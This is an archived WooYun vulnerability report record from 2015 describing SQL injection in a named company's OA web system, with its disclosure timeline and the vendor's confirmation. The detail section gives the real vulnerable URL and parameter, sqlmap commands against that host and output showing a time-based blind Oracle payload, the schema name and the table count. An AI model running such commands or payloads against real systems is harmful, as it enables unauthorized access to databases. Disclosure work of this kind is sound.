{"id": 41085, "wybug_id": "wooyun-2015-089976", "wybug_title": "魔方某分站SQL注入", "wybug_corp": "52mf.com.cn", "wybug_author": "Coody", "wybug_date": "2015-01-05 18:54", "wybug_open_date": "2015-02-19 18:56", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-19：\t细节向公众公开  简要描述： ...SQL注入 详细说明：  0x01: 罗嗦两句看到 @her0ma  提交的漏洞  WooYun: 魔方某系统SQL注入漏洞(员工帐号密码手到擒来) 漏洞状态： 漏洞已经通知厂商但是厂商忽略漏洞为神马要忽略呢、百思不得解；sql注入出现在站点：http://oa.52mf.cn/ 上，可以参考我之前提交的通用型漏洞 WooYun: 泛微某系统通用型SQL注入(无需登录) 这里提出的意见是：①多看看厂商的漏洞补丁信息②Wooyun.org搜索[泛微]查看是否有最新的漏洞出现0x02: 漏洞详情问题链接：http://oa.52mf.cn/weaver/weaver.email.FileDownloadLocation?fileid=32&download=1问题参数：fileid数据库：Oracle爆出当前数据库名称\nC:\\Users\\Administrator>sqlmap.py -u \"http://oa.52mf.cn/weaver/weaver.email.FileDownloadLocation?fileid=32*&download=1\"  --dbms=oracle  --current-db\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: http://oa.52mf.cn:80/weaver/weaver.email.FileDownloadLocation?fileid=32 AND 5729=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)&download=1---[21:22:59] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[21:22:59] [INFO] fetching current database[21:22:59] [WARNING] time-based comparison requires larger statistical model, please wait..............................do you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n][21:23:28] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors[21:23:42] [INFO] adjusting time delay to 2 seconds due to good response times[21:23:52] [ERROR] invalid character detected. retrying..[21:23:52] [WARNING] increasing time delay to 3 secondsECOLOGY[21:27:31] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'ECOLOGY'[21:27:31] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\oa.52mf.cn'\n\n\n爆出数据库“ECOLOGY”中所有的表名（因1394多张表，这里不一一列出，证明即可）\nC:\\Users\\Administrator>sqlmap.py -u \"http://oa.52mf.cn/weaver/weaver.email.FileDownloadLocation?fileid=32*&download=1\"  --dbms=oracle  -D ECOLOGY --tables\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: http://oa.52mf.cn:80/weaver/weaver.email.FileDownloadLocation?fileid=32 AND 5729=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)&download=1---[21:34:43] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[21:34:43] [INFO] fetching tables for database: 'ECOLOGY'[21:34:43] [INFO] fetching number of tables for database 'ECOLOGY'[21:34:43] [WARNING] time-based comparison requires larger statistical model, please wait..............................[21:34:53] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)[21:34:53] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors1394[21:37:10] [INFO] retrieved: BASE_F...\n\n\n不再深入…   漏洞证明：     修复方案：     版权声明：转载请注明来源 Coody@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-01-06 09:04 厂商回复： 我公司认领该漏洞，并在处理中。谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}